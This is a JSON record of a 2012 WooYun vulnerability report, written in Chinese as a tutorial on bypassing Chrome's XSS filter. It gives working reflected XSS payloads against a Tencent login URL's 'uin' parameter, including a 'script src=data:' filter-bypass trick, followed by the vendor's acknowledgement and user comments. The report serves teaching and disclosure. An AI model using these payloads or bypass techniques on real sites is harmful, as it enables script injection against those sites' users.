{"id": 14618, "wybug_id": "wooyun-2012-016672", "wybug_title": "[腾讯实例教程] 那些年我们一起学XSS - 17. XSS过滤器绕过 [通用绕过]", "wybug_corp": "腾讯", "wybug_author": "心伤的瘦子", "wybug_date": "2012-12-29 18:00", "wybug_open_date": "2013-02-12 18:00", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "2", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-12-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-12-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-01-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-01-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-02-12：\t细节向公众公开  简要描述： 关于反射型的基本东西，暂时就到这啦，如果后面有什么好的case，再做增补。最近，有些人会问到怎么绕过浏览器的XSS过滤器，所以从这节开始，给出点绕过的例子。当然这些绕过浏览器的方法，不是万能的。不同浏览器，不同场景都会存在差异。满足场景要求时，才可以使用。IE的一些绕过见乌云上的 @gainover，@sogili 的例子，我们教程就不再提及了。此文给出的是一个来自sogili分享的chrome下绕过过滤器的方法，在腾讯某处XSS上的应用。这一类都算是“结合了一定场景”，绕过了浏览器自身的防御机制，具有一定的通用性，我们称为“通用绕过”（瞎起的名字，别在意）。但是在后续版本的浏览器中，这些技巧可能会被浏览器干掉从而失效。再次强调：通用不是全部都行，意思是所适用的场景实际发生的概率比较高！ 详细说明：  1. 其实就是个普通的XSS点，uin参数没有对任何字符进行过滤。\nhttp://bangbang.qq.com/php/login?game=roco&uin=\"><img src=1 onerror=alert(1)>&world=5&roleid=44583443&level=8&role=%2\n2. 正是由于这个点什么都没过滤，浏览器自身的防御机制也最好发挥作用，瞧瞧，chrome拦截了。。\n\n有的新手，不知道有过滤器的，更是会觉得 “啊，这是怎么回事，怎么不行啊，明明可以的。。”我们只要看到console里有上面那句，就说明 chrome的过滤器大发神威了！！3. 我们也看看源码。\n\n危害部分被和谐了。4. 那么怎么绕过呢？ 这里直接说方法。5. 首先要求缺陷点，允许 < ,  > 。其次，要求缺陷点的后方存在 </script> 标签。 我们看看当前的这个点的代码。\n...<input type=\"hidden\" id=\"sClientUin\" value=\"\"><img src=1 onerror=alert(1)>\">...<script type=\"text/javascript\" src=\"http://pingjs.qq.com/tcss.ping.js\"></script>...\n6. 可以看到上面的要求均满足。我们就可以使用以下技巧。\n<script src=data:,alert(1)<!--\n7. 代入到我们的利用代码里。\nhttp://bangbang.qq.com/php/login?game=roco&uin=\"><script src=data:,alert(1)<!--&world=5&roleid=44583443&level=8&role=%2\n这次，我们就成功啦。\n\n   漏洞证明：  见详细说明   修复方案：  参见教程1   版权声明：转载请注明来源 心伤的瘦子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2012-12-31 09:56 厂商回复： 非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-12-29 18:02 |    \t\t陈再胜 \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:13        | 微博收收听~~~●﹏●)\t\t \n  终于大结局了······    \n     2012-12-29 18:04 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  @陈再胜 不是大结局，前面只是反射型的说完了，接着还有存储型的。    \n     2012-12-29 18:06 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  @心伤的瘦子 @陈再胜 胖子的意思是说，第一季已经结束，第二季马上上映、、天天熬夜挖洞，写教程，胖子自然变瘦子。。。    \n     2012-12-29 18:28 |    \t\tClar \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 当前无)\t\t \n  这篇应该很精彩！    \n     2012-12-29 18:28 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @心伤的瘦子 大湿呀，出来出呀~    \n     2012-12-29 19:06 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  @心伤的瘦子 @鬼魅羊羔 等第二季了～～    \n     2012-12-29 19:13 |    \t\t0x00de \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 一个二逼，2到家了的小白。)\t\t \n  又发了    \n     2012-12-29 19:30 |    \t\tdyun \t\t\t( 普通白帽子  |\t\t\t        Rank:102 漏洞数:15        | [code][/code])\t\t \n  哦周末 洞主不是不发么~~~    \n     2012-12-29 19:52 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  @dyun 元旦前，是要上班的。 今天还没放假。    \n     2012-12-29 20:41 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  flash xss可以绕过所有浏览器,刚好有个tencent的。。    \n     2012-12-29 21:29 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  @蟋蟀哥哥 ：） 说不定你手上的，已经被我报了，腾讯还未修复而已，哈。 这里的绕过，只是为了尽可能的增加一些鸡肋XSS的适用性。    \n     2012-12-29 22:31 |    \t\tRoyal. \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:8        )\t\t \n  求放映地址    \n     2012-12-30 02:26 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @心伤的瘦子 尼玛。。缺德    \n     2012-12-30 08:43 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  @蟋蟀哥哥 二货，有东西赶紧报，小心被截胡的，我就犯二了一次，拍拍的XSS消息走漏了，同一天有三个人同时提交我那个XSS。。我差点抑郁了。。    \n     2012-12-30 09:30 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @鬼魅羊羔 我的人人网的也被截胡了。。。    \n     2012-12-30 09:31 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  擦 全是腾讯的，这要私藏多少啊。。。    \n     2012-12-30 12:43 |    \t\tErrorera \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:21        | 我们应该在犯错误的情况下学习！)\t\t \n  @鬼魅羊羔 @鬼魅羊羔 是拍拍商户后台的编辑器img那里?    \n     2013-01-30 11:28 |    \t\tKaier \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        )\t\t \n  终于能看了。嘎嘎    \n     2013-08-06 13:53 |    \t\t1428666 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | script kid)\t\t \n  用手机百度搜索这边文章，经过转码后，您的alert（1）弹窗了，具体位置在百度分享那里。这算不算跨站？    \n     2013-08-07 10:07 |    \t\tlxj616 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:90        | <hohoho>)\t\t \n  @1428666 真的假的 我试试看    \n     2013-08-07 10:10 |    \t\tlxj616 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:90        | <hohoho>)\t\t \n  @lxj616 http://wap.baidu.com/ssid=0/from=0/bd_page_type=1/uid=FDC1D3C95923C76664C364E1B8CB455B/baiduid=562387BF09D50D6B87C2740BCFD9B389/pu=sz%40224_220%2Cta%40middle____%2Cusm%400/w=0_10_%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS+-+17/t=wap/l=0/tc?ref=www_colorful&lid=5455767530950146704&order=2&vit=osres&tj=www_normal_2_0_10&sec=31778&di=441fcb453e4fcd5d&bdenc=1&nsrc=E-zV0QEptyoA_yixCFOxXnANedT62v3IEQGG_zdL0S3bo93saPOaUbBcVzTg2Sm5FEb7rXOEvBsFwXS707Uk8xN2<P>1. 其实就是个普通的XSS点，uin参数没有对任何字符进行过滤。<BR></P>http://bangbang.qq.com/php/login?game=roco&amp;uin=\"&gt;&lt;img src=1 onerror=alert(1)&gt;&amp;world=5&amp;roleid=44583443&amp;level=8&amp;role=%2<BR><P>2. 正是由于这个点什么都没过滤，浏览器自身的防御机制也最好发挥作用，瞧瞧，chrome拦截了。。</P>转义了？没有重现上述弹窗，请帖地址？    \n     2013-08-08 23:33 |    \t\t1428666 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | script kid)\t\t \n  就是这篇文章，用手机查看的，电脑访问wap我试过无效，就是用手机看，就会弹出来。    \n     2013-08-08 23:35 |    \t\t1428666 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | script kid)\t\t \n  @lxj616 就是这篇文章，用手机查看的，电脑访问wap我试过无效，就是用手机看，就会弹出来。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}